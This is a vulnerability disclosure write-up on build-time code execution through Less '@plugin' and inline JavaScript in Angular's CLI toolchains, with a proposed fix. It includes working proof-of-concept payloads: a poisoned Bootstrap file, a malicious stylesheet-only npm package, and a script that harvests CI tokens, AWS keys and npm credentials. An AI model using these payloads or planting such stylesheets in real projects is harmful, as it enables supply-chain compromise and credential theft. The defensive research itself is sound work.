# Stylesheets Are Code: Hunting a Build-Time RCE Primitive Hidden in Plain Sight for Four Years

## Introduction

Every few months, the npm ecosystem absorbs another supply-chain incident and the response converges on the same advice: turn off install scripts. After s1ngularity it was `--ignore-scripts`. pnpm 10 shipped lifecycle scripts off by default. Yarn Berry has had `enableScripts: false` since forever. By early 2026 this had become the default posture in serious shops — a hardening dashboard with these three checkboxes green is what passes for "we did supply-chain."

I started this research because I wanted to know what the boxes *don't* check.

The answer turned out to be a four-year-old security flag in a CSS preprocessor that nobody enabled, and a one-line `@import` from a stylesheet — an operation no defense in the npm ecosystem treats as a code-execution boundary — that produces silent arbitrary code execution on every Angular project's build machine, after every deployed defense has done its job and gone home.

This is a story about how a file class everyone assumes is data became code, and how I almost missed the actual bug because my own first patch didn't work.

## The shape of the question

If you accept that install-time defenses now exist, the interesting question is: what runs *after* the install step that an attacker can still reach with package-controlled content?

Three categories:

1. **What the consumer's code imports.** `import 'pkg'` executes the package's main module. Defended by code review of dependency JS surfaces, sort of, in theory.
2. **What the build tool reads.** Webpack, Vite, esbuild, the framework-specific wrappers around them. Tools that *parse* package-controlled files at build time.
3. **What the build tool's loaders evaluate.** This is where it gets interesting, because "evaluate" sometimes means more than the consumer thinks.

Category 3 is the surface I went looking through. I started with the file types whose handlers had non-trivial logic — the loaders for SVG, MDX, GraphQL schema files, YAML, and the CSS preprocessor family. Most of these are boring: they parse, they emit, they don't execute consumer-controlled JavaScript reachable from package-controlled content.

The CSS preprocessor family was where my eyebrow went up.

## Why preprocessors are interesting

Modern frontends ship one of three: Sass (dart-sass), Less, or Stylus. The framework toolchains compile these at build time. The compilation step happens **after** install, **after** the lifecycle scripts that the install-time defenses block. If a preprocessor's compile step has any path to JavaScript execution, that path runs in a context where the install-time hardening has already passed.

I read the docs. Sass, in modern dart-sass, exposes JavaScript only through *consumer-registered custom functions*. The package being compiled cannot reach JS reachable from imported stylesheet syntax — there's no `@-anything` in `.scss` that loads and executes a JS module. I confirmed this by trying. Three payload variants in `.scss` — `@use "sass:meta"`, inline interpolation injection, fake module-system tricks. All failed at the parser level, no execution.

Then I opened the Less.js docs.

```less
@plugin "./my-plugin.js";
```

Less plugins are JavaScript modules. The `@plugin` directive *loads them by relative path*, at compile time, from a stylesheet. There is a validation: `if (typeof plugin !== 'function' || plugin.postcss !== true)`. But validation runs after `require()`, and `require()` runs the module's top-level code.

This was already enough to make me sit up. I built a one-file PoC against bare `lessc` to confirm. It worked. `node_modules/.bin/lessc input.less output.css` with `@plugin "./pwn.js";` in `input.less` and `pwn.js` writing to `/tmp` — wrote to `/tmp`. Less.js, by itself, treats stylesheet input as code-loading authority.

But `lessc` on the CLI is not the threat model. The threat model is a build tool that compiles stylesheets, including stylesheets reached transitively through `@import` from `node_modules`. Did any of them disable this?

## The four-year-old flag

In June 2022, Less v4.1.3 shipped this:

```js
additionalData: {
  disablePluginRule: true
}
```

The release note pointed at Less issue #3561 — a security report about `@plugin` against untrusted stylesheet input. The maintainers added the flag specifically so consumers compiling untrusted Less could refuse the directive at parse time.

The opt-in flag is the giveaway. Less knew. The fix has existed for four years. The question reduces to: did the build tools that compile `node_modules`-resident `.less` files turn it on?

I started with the obvious target.

## Reading the Angular CLI source

`@angular/build`, the modern esbuild-based builder shipped by `ng new` in current Angular:

```ts
// packages/angular/build/src/tools/esbuild/stylesheets/less-language.ts
const { imports, css } = await less.render(data, {
  filename,
  paths: options.includePaths,
  plugins: [resolverPlugin],
  rewriteUrls: 'all',
  sourceMap: options.sourcemap
    ? { sourceMapFileInline: true, outputSourceFiles: true }
    : undefined,
} as Less.Options);
```

No `disablePluginRule`. Pulled the legacy webpack toolchain, `@angular-devkit/build-angular`:

```ts
{
  loader: require.resolve('less-loader'),
  options: {
    implementation: require('less'),
    sourceMap: cssSourceMap,
    lessOptions: {
      javascriptEnabled: true,
      paths: includePaths,
    },
  },
},
```

No `disablePluginRule`. And — `javascriptEnabled: true`, hardcoded.

`javascriptEnabled` is Less's other JavaScript primitive: backtick-syntax inline JavaScript inside Less expressions. Less itself deprecated it years ago. Angular's legacy toolchain hardcodes it on. I checked the unpkg-hosted compiled artifacts of `@angular-devkit/build-angular` from v14.0.0 forward. Same line, every version, through v21.2.8. Eight major versions. Roughly four years.

Then `ng-packagr`, Angular's library publisher. Same Less invocation, same defaults. Whatever Angular ships, ships through this too — meaning if a library author's *build* gets popped, the *published artifact* carries the payload to every downstream consumer.

Three Angular-maintained toolchains. None had adopted the four-year-old upstream mitigation. One had additionally pinned a deprecated unsafe option to `true`.

In September 2025 — six months before this work — PR #31267 had touched the Less options surface in `@angular/build`. It removed `javascriptEnabled` from that path as deprecation cleanup, with no security framing. The author had the file open. `disablePluginRule` could have been one line in the same diff. It wasn't.

This is the part of the writeup where I'd usually expect to discover I was wrong about something. I wasn't.

## Building the PoC that actually matters

Demonstrating execution against bare `lessc` proves nothing. Demonstrating execution against a `lessc` you've configured loosely on purpose proves nothing. The PoC has to land on a default configuration that real users run.

The realistic threat model is: an attacker compromises an npm package — or hijacks a maintainer account on a popular one — and ships malicious `.less` content. The consumer's project does what it's always done: `@import` the package's stylesheets. The execution chain has to work without the consumer changing any setting, without bypassing any default, on the configuration that `ng new` produces.

```bash
npx -y @angular/cli@latest new poc-app --style=less --skip-git --defaults
cd poc-app
npm install --no-audit --no-fund bootstrap@3.4.1
```

Bootstrap 3 was the choice for a reason. It's frozen, it's still on the registry, it has 756k weekly downloads, and v3's documentation explicitly recommends `@import "bootstrap/less/bootstrap.less"` as the consumption pattern. It is the most boring possible legitimate `.less` import a real Angular project might have.

The attacker-controlled artifact is one appended line in a real file inside `node_modules/bootstrap`:

```bash
echo '@plugin "./pwn.js";' >> node_modules/bootstrap/less/variables.less
```

Plus a sibling JS payload in the same directory. Cross-platform by construction — writes to `os.tmpdir()`, no `/tmp` hardcoding:

```js
const fs = require('fs'), os = require('os'), path = require('path');
fs.writeFileSync(path.join(os.tmpdir(), 'PWNED'),
  'RCE: pid=' + process.pid + ' platform=' + process.platform);
module.exports = function() { return { install() {} }; };
```

The consumer's stylesheet is one line, indistinguishable from how every Bootstrap-on-Less project in the world has looked for a decade:

```less
@import "bootstrap/less/variables.less";
```

`ng build`:

```
✔ Building...
Application bundle generation complete. [0.881 seconds]
```

`PWNED` file present in `os.tmpdir()`. Build success message printed. Compiled CSS in `dist/` contains a clean Bootstrap CSS body — a code reviewer auditing the build output sees nothing.

I sat with that 0.881-second number for a while. Most build-tool RCEs crash the build, or hang, or leave a trace in the logs. The victim has *something* to investigate. This one prints success.

## The legacy-path bonus: one stylesheet, no JavaScript file

I wanted to see if the legacy toolchain's hardcoded `javascriptEnabled: true` was independently exploitable, without `@plugin`, without a sibling `.js` file. The Less inline-JavaScript syntax is gated:

```less
.x { color: `(function(){ /* JS */ })()`; }
```

If this fires, a single `.less` file is sufficient. The package can be pure-stylesheet.

Less's eval context blocks bare `require` — calling `require()` inside the backtick body throws `ReferenceError`. But `process` is in scope, and Node's `process.mainModule.require` is the real `require`. Either way, the version that doesn't even need that bypass — a self-contained IIFE that reads `os.tmpdir()` and writes a file — fires fine on its own:

```less
.pwn { color: `(function(){
  const fs = require('fs'), os = require('os'), path = require('path');
  fs.writeFileSync(path.join(os.tmpdir(), 'PWNED_INLINE'), 'RCE inline-JS pid=' + process.pid);
  return 'red';
})()`; }
```

Switch the Angular project's builder to `@angular-devkit/build-angular:browser`, drop this in `src/styles.less`, run `ng build`. Marker file written. Modern path forces `@plugin` + sibling JS; legacy path collapses to one stylesheet, no other artifacts.

## What the install-time defenses see

This is the part of the chain I think is actually novel.

Build the malicious package as it would arrive on the registry — no `postinstall`, no `scripts.preinstall`, no JavaScript surface the consumer imports:

```json
{
  "name": "evil-icon-pack",
  "version": "1.0.0",
  "main": "dist/icons.less",
  "files": ["dist"]
}
```

`dist/icons.less` contains `@plugin "./payload.js";`. `dist/payload.js` contains the marker-write. That's it.

```bash
npm install --ignore-scripts /tmp/evil.tgz
```

`--ignore-scripts` does its job. No lifecycle script runs. The deployed defense reports clean. Add the import:

```less
@import "evil-icon-pack/dist/icons.less";
```

`ng build`. Marker file present.

I repeated this with `pnpm add` (default-off lifecycle scripts, the post-s1ngularity default) and `yarn add` on Yarn Berry with `enableScripts: false`. Same outcome. pnpm 10's `onlyBuiltDependencies` allowlist doesn't apply — there is no lifecycle event for it to consult.

The interesting property of this package is its surface. `"main": "dist/icons.less"`. Zero `.js` exports the consumer's TypeScript imports. The consumer interaction is `@import`. There is no published guidance, anywhere, that treats `@import` from a stylesheet as a trust boundary requiring review of the imported package. SCA tooling — Snyk, Socket, Dependabot, GitHub Advanced Security — does not parse `.less` files for executable content. There is no CVE class for this yet, so no rule to write.

| Defense | Why it doesn't apply |
|---|---|
| `npm install --ignore-scripts` | Execution at build time, not install |
| pnpm 10 default-off lifecycle scripts | Same — not a lifecycle event |
| Yarn Berry `enableScripts: false` | Same |
| Code review of `scripts` field | Payload is `.less`, not `package.json` |
| Code review of `.js` files | Payload is `.less` |
| SCA scanners | `.less` not in content-inspection allowlists |
| CSP / runtime sandboxing | Build-time, before any runtime policy |
| `--style=scss` project-level default | Transitive deps still ship `.less` |

Every defense the ecosystem has shipped against installed-package code execution targets either the install lifecycle or `.js` file extensions. The chain here is neither.

## What actually gets stolen

A marker file in `os.tmpdir()` is a proof artifact, not an impact statement. The realistic payload reads its environment:

```js
const fs = require('fs'), os = require('os'), path = require('path');
const env = process.env;
const tryRead = p => { try { return fs.readFileSync(p, 'utf-8').slice(0, 200); } catch { return null; } };
const home = env.HOME || env.USERPROFILE;
fs.writeFileSync(path.join(os.tmpdir(), 'EXFIL.json'), JSON.stringify({
  ci_secrets: {
    GITHUB_TOKEN: env.GITHUB_TOKEN,
    NPM_TOKEN: env.NPM_TOKEN,
    AWS_ACCESS_KEY_ID: env.AWS_ACCESS_KEY_ID,
    AWS_SECRET_ACCESS_KEY: env.AWS_SECRET_ACCESS_KEY,
    GOOGLE_APPLICATION_CREDENTIALS: env.GOOGLE_APPLICATION_CREDENTIALS,
  },
  fs_reachable: {
    npmrc: tryRead(path.join(home, '.npmrc')),
    aws_creds: tryRead(path.join(home, '.aws/credentials')),
    gh_hosts: tryRead(path.join(home, '.config/gh/hosts.yml')),
  },
}, null, 2));
module.exports = function() { return { install() {} }; };
```

Run inside a normal CI build with simulated CI env. After `Application bundle generation complete.`, the dump contained: `GITHUB_TOKEN`, `NPM_TOKEN`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GOOGLE_APPLICATION_CREDENTIALS`, `~/.npmrc` (npm publish token), `~/.aws/credentials` (AWS access key + secret), `~/.config/gh/hosts.yml` (GitHub CLI OAuth token).

The build tool's notional security authority is "compile stylesheets and emit bundles." The actual security authority of a process running under a CI runner's identity is "everything that runner can authenticate as, including production deploys." The gap between those two is the entire impact of this bug. CVSS 3.1 calls this `S:C` — Scope: Changed — and the call is correct.

There's a second-order amplifier worth naming explicitly. `ng-packagr` is Angular's library publisher. A library author who consumes a poisoned transitive `.less` dep at build time becomes a distribution vector when they publish — first-hop compromise during `ng build my-lib` injects the payload into the published artifact's stylesheet surface, which then fires on every consumer's `ng build`. The published library is not malicious. The author did not see anything wrong. One upstream `.less` compromise reaches every downstream consumer of every Angular library that touches Less.

## The mitigation that didn't work

Here is where the research turned, and where I want to be honest about the path.

The natural fix, the one any reader of this so far is already drafting in their head, is one option per toolchain:

```diff
  await less.render(data, {
    filename,
    paths: options.includePaths,
    plugins: [resolverPlugin],
    rewriteUrls: 'all',
+   disablePluginRule: true,
    sourceMap: ...,
  });
```

I patched the installed `@angular/build` package in my reproduction environment and re-ran the PoC.

The `PWNED` file appeared.

I ran it three more times, convinced I'd typoed something. `PWNED` every time. The flag was set — I logged the options object inside `less-language.ts` to confirm — and the PoC was firing through it.

This was not a defeat for the patch. This was a defeat for my model of how Less.js worked. I went into Less's source.

`Parser.parse(str, callback, additionalData)` reads `additionalData.disablePluginRule` and installs a parse-time guard that throws on `@plugin`. The guard is installed *only on the call that received `additionalData`*. The import-manager — the part of Less that handles `@import` — invokes `Parser.parse()` recursively on imported files **without propagating `additionalData`**. The guard is installed on the entry stylesheet. It is not re-installed for any imported file.

I instrumented the bundled parser to make the propagation gap visible:

```
[LESS-BUNDLE-PROBE] parse called, disablePluginRule=true                filename=src/styles.less
[LESS-BUNDLE-PROBE] parse called, disablePluginRule=no-additionalData   filename=?
```

| `@plugin` location | `disablePluginRule: true` blocks it? |
|---|---|
| Entry stylesheet (`src/styles.less`) | yes, parse-time error |
| `@import`-ed file (e.g. `bootstrap/less/variables.less`) | no, fires |

The PoC #1 attack shape — `@plugin` in the *transitively imported* file inside `node_modules` — is exactly the case the upstream-recommended mitigation doesn't cover. The realistic supply-chain shape is the one the flag misses.

This makes the four-year mitigation gap worse, not better. Even if Angular had adopted `disablePluginRule: true` four years ago when it shipped, the natural attack shape would still have worked. Documentation framing the flag as *the* fix would have produced a false sense of security at every consumer.

## The complete fix

`disablePluginRule: true` is still worth setting — it produces a clean parse-time error for the entry-stylesheet case, and it's the upstream-recommended posture for projects that don't intentionally use `@plugin`. But it has to be paired with a content scrub that runs on every file the resolver loads, including the imported ones the Less parser is about to recurse into.

The scrub goes in the resolver plugin's `loadFile`, which sees every file before Less parses it:

```ts
private static _containsPluginDirective(text: string): boolean {
  const stripped = text
    .replace(/\/\*[\s\S]*?\*\//g, ' ')      // block comments
    .replace(/\/\/[^\n]*/g, ' ')             // line comments
    .replace(/"(?:[^"\\]|\\.)*"/g, '""')     // double-quoted strings
    .replace(/'(?:[^'\\]|\\.)*'/g, "''");    // single-quoted strings
  return /@plugin\b/.test(stripped);
}
```

The comment- and string-stripping is load-bearing. A naive `^[\t ]*@plugin\b` regex bypasses on `/* harmless */ @plugin "./pwn.js";` (block-comment-prefix decoy, verified bypasses). A regex that doesn't strip strings false-positives on `.x { content: "@plugin documentation only"; }` (verified false positive). Both branches are tested.

For the legacy path's second primitive — inline backtick JavaScript — `javascriptEnabled: false` flips it off. Real Less use cases that were on `javascriptEnabled: true` in the wild are theme math (Ant Design configurations were the case I checked). Setting `math: 'always'` covers them: division, unit arithmetic, expression evaluation. I verified an Ant-style theme math expression `(@base * 1.5) / @cols` produces the correct value with `math: 'always'` and `javascriptEnabled: false`. No escape-hatch flag is needed.

Final shape, for the modern path:

```diff
  await less.render(data, {
    filename,
    paths: options.includePaths,
    plugins: [resolverPlugin],   // resolverPlugin's loadFile now scrubs @plugin
    rewriteUrls: 'all',
+   math: 'always',
+   disablePluginRule: true,
    sourceMap: ...,
  });
```

For the legacy path:

```diff
  lessOptions: {
-   javascriptEnabled: true,
+   javascriptEnabled: false,
+   math: 'always',
+   disablePluginRule: true,
    paths: includePaths,
  },
```

Same scrub at `ng-packagr`'s Less invocation site.

The verification matrix I ran on the proposed fix:

| Scenario | Result |
|---|---|
| Original PoC #1 (`@plugin` in transitively imported `bootstrap/variables.less`) | blocked by content scrub; build fails; `PWNED` not written |
| Clean build, no `@plugin`, normal Less stylesheets | builds normally |
| `@plugin` directly in entry `src/styles.less` | blocked by Less's own `disablePluginRule` |
| Two-hop import: `styles.less` → `a.less` → `b.less` (containing `@plugin`) | blocked by scrub at deepest `loadFile` |
| Decoy bypass: `/* harmless */ @plugin "./pwn.js";` | blocked (comment stripped before scan) |
| False-positive test: `.x { content: "@plugin docs only"; }` | builds normally (string contents stripped) |
| Theme math: `(@base * @scale * @scale / 2)` with `math: 'always'`, `javascriptEnabled: false` | correct numeric output |
| Inline backtick JS with `javascriptEnabled: false` | throws "Inline JavaScript is not enabled" |

## Sass, again, briefly

Same payload patterns in `.scss` — `@use "sass:meta"`, inline interpolation injection, every fake-module trick I had — fail at the dart-sass parser level, no marker file written. Sass exposes JavaScript only via consumer-registered custom functions. It does not execute JS reachable from imported stylesheet content. Less is the outlier. This isn't "all preprocessors do this."

## Reflections

A few things I want to leave the reader with.

**File classes drift.** In 2014, you'd be laughed out of a code review for treating a `.less` file as untrusted in the same way you'd treat a `.js` file. Today, the only difference between the two is whether your build tool's loader has the right flag set. The shift from "data" to "code" doesn't happen at a moment in time; it happens silently, at each loader, on different schedules, often without security review of the loader's defaults. The same pattern produced the famous image-parser RCE class — libpng, ImageMagick — where a file format previously assumed to be inert became an oracle that decoded directly into memory corruption. Stylesheets in 2026 occupy the same role.

**Mitigation surface ≠ deployed mitigation.** Less shipped `disablePluginRule` four years ago. The flag has been documented, available, and stable for the entire window. It was not adopted by the build tool that compiles `.less` files for the largest production frontend framework that uses Less by default. The flag's existence is not the fix. The flag's *adoption*, in the toolchains that compile attacker-reachable content, is the fix.

**Upstream-recommended mitigations are sometimes incomplete.** I almost shipped a follow-up patch that didn't actually block my own PoC. The propagation gap in `additionalData` is a real bug in Less.js, not in Angular, but the consequence at the consumer's end is identical: the natural fix, applied as documented, doesn't stop the natural attack shape. The lesson is to test the patch against the realistic threat model, not against the simplified case used to demonstrate the bug class.

**The defense-in-depth narrative has a gap.** The post-s1ngularity hardening guidance — `--ignore-scripts`, pnpm default-off, Yarn Berry — is correct and worth keeping. It is also, demonstrably, not sufficient. The implicit assumption underneath all three defenses is that package-controlled code execution flows through `.js` and through the install lifecycle. Both halves of that assumption are wrong, and the gap between "what the defense covers" and "where the execution actually happens" is where this finding lives. The next class will live somewhere similar.

## Disclosure status

The Angular toolchains affected — `@angular/build`, `@angular-devkit/build-angular`, `ng-packagr` — were notified through the appropriate channel, which declined to track the issue. Public disclosure was authorized. The Less.js parser propagation gap was reported privately upstream; no public reproducer for that part is included here.

The fix is small. The PoC runs in 0.881 seconds against a default `ng new` project with a real-world transitive dependency, prints success, and bypasses every install-time defense the ecosystem currently ships. The next time the supply-chain hardening dashboard is green, the question to ask is which file extensions it knows about.

---

*Verified against `@angular/cli` v22.0.0-next.6, `@angular-devkit/build-angular` v21.2.8, `ng-packagr` v21.2.2, `less` v4.6.4, Node.js v22.22.2 on Linux. Payload uses `os.tmpdir()` and `path.join`, cross-platform by construction. PoC reproduces clean inside Docker `node:22`.*
